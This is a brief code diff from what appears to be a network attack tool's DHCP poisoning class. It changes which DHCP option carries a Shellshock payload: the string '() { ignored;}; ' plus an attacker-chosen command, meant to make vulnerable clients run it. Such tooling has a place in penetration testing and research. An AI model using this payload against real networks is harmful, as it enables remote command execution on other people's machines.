@@ -138,7 +138,7 @@ class DHCPpoisoner():
 
                 if self.shellshock:
                     log.info("Sending DHCP ACK with shellshock payload")
-                    packet[DHCP].options.append(tuple((114, "() { ignored;}; " + self.shellshock)))
+                    packet[DHCP].options.append(tuple(('root_disk_path', "() { ignored;}; " + self.shellshock)))
                     packet[DHCP].options.append("end")
                 else:
                     log.info("Sending DHCP ACK")
